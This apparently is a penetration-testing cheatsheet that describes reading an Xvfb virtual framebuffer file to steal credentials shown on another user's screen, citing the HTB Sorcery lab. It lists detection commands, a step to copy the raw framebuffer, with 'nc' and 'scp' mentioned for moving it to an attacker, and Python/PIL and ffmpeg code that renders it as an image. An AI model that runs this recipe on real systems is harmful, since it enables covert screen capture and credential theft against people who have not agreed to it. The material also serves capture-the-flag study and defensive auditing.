---
title: "Xvfb Framebuffer Reading for Credential Theft"
date: 2026-03-27
draft: false
author: "keyll0ger"
description: "Cheatsheet: Xvfb Framebuffer Reading for Credential Theft"
summary: "PrivEsc | Xvfb Framebuffer Reading for Credential Theft"
tags:
  - "Privilege Escalation"
  - "Cheatsheet"
categories:
  - "Cheatsheet"
  - "PrivEsc"
ShowToc: true
TocOpen: false
---

## Context
Xvfb (X Virtual Framebuffer) is a display server that performs graphical operations in memory. When started with `-fbdir <path>`, it writes raw pixel data to disk as `Xvfb_screen0`.

## Detection
```bash
# Check for running Xvfb with -fbdir
ps aux | grep Xvfb
# Look for: Xvfb :99 -screen 0 512x256x24 -fbdir /xorg/xvfb/

# Check if framebuffer file is readable
ls -la /xorg/xvfb/Xvfb_screen0
# Also check: /tmp/.X* directories

# Check what apps are running on that display
DISPLAY=:99 xdotool getactivewindow getwindowname 2>/dev/null
# Or just check processes with DISPLAY env
grep -rl 'DISPLAY' /proc/*/environ 2>/dev/null
```

## Exploitation
The framebuffer is raw pixel data. Resolution and color depth come from the Xvfb `-screen` argument.

### Copy the framebuffer
```bash
# On target
cp /xorg/xvfb/Xvfb_screen0 /tmp/fb.raw
# Transfer to attacker (scp, nc, base64, etc.)
```

### Convert to PNG (Python/PIL)
```python
from PIL import Image

# Screen geometry from Xvfb args: -screen 0 WIDTHxHEIGHTxDEPTH
WIDTH = 512
HEIGHT = 256
DEPTH = 24  # depth 24 = BGRX format (32 bits per pixel, 4 bytes)

data = open('fb.raw', 'rb').read()
img = Image.frombytes('RGB', (WIDTH, HEIGHT), data, 'raw', 'BGRX')
img.save('framebuffer.png')
```

### Convert with ffmpeg (alternative)
```bash
# depth 24 with -fbdir uses BGRX (4 bytes per pixel)
ffmpeg -f rawvideo -pixel_format bgr0 -video_size 512x256 -i fb.raw fb.png
```

## Key Notes
- Depth 24 actually uses 32 bits (4 bytes) per pixel in BGRX format (the X byte is padding)
- The file is continuously updated as the screen changes
- If a text editor (mousepad, gedit, vim in X) has credentials open, they are visible in the framebuffer
- The file size should be: WIDTH * HEIGHT * 4 bytes (for depth 24)
- Multiple screens: `Xvfb_screen0`, `Xvfb_screen1`, etc.

## Seen In
- HTB Sorcery (Insane): tom_summers could read Xvfb framebuffer showing mousepad with tom_summers_admin's passwords.txt
